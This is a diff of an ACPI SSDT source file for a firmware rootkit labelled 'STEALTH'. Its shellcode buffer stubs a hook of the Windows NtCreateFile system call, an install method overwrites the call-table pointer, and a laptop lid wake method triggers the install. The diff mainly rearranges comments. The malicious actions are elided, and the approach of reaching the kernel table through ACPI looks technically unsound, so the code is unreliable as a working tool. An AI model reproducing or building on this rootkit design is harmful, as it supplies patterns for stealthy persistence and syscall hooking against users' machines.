@@ -13,31 +13,34 @@ DefinitionBlock ("SSDT", "SSDT", 2, "OEMID", "STEALTH", 0x00000002)
     // 2. Define a Field for the specific system call pointer we want to hook.
     Field (SSDT, QWordAcc, NoLock, WriteAsZeros)
     {
-        NTCR,   64      // Field for NtCreateFile's 64-bit address
+        NTCR, 64
     }
 
     // 3. Define the rootkit's payload. This buffer contains the malicious shellcode.
-    //    This is where the rootkit would hide files, log data, etc.
-    Name (RKIT, Buffer()
+    // push rax
+    // push rcx
+    // ... (malicious actions, e.g., disabling security software) ...
+    // pop rcx
+    // pop rax
+    // mov rax, &Original_NtCreateFile
+    // jmp rax
+    Name (RKIT, Buffer(0x10)
     {
-        // --- Malicious Shellcode Placeholder ---
-        0x50,                                           // push rax
-        0x51,                                           // push rcx
+        0x50, 0x51,
         // ... more instructions to perform malicious action ...
-        0x59,                                           // pop rcx
-        0x58,                                           // pop rax
-        // --- JMP to Original Function ---
-        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, &Original_NtCreateFile
-        0xFF, 0xE0                                      // jmp rax
+        0x59, 0x58,
+        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0xFF, 0xE0
     })
 
     // 4. An installation method that performs the actual hook.
+    // Store the address of our rootkit buffer (RKIT) into the
+    // SSDT, overwriting the original NtCreateFile pointer.
     Method (INST, 0, NotSerialized)
     {
-        // Store the address of our rootkit buffer (RKIT) into the
-        // SSDT, overwriting the original NtCreateFile pointer.
         Store (RKIT, NTCR)
     }
+
 
     // 5. Use a common device and method as a trigger. Here, we use the
     //    system wake event (_WAK) of the laptop lid device (PNP0C0D).
@@ -47,9 +50,8 @@ DefinitionBlock ("SSDT", "SSDT", 2, "OEMID", "STEALTH", 0x00000002)
         {
             Name (_HID, EisaId ("PNP0C0D"))
             Name (_UID, "Lid")
-            Method (_WAK, 1, NotSerialized) // Triggered on system wake-up
+            Method (_WAK, 1, NotSerialized)
             {
-                // If the hook isn't already installed, install it.
                 INST ()
                 Return (Package (0x02) { 0x00, 0x00 })
             }
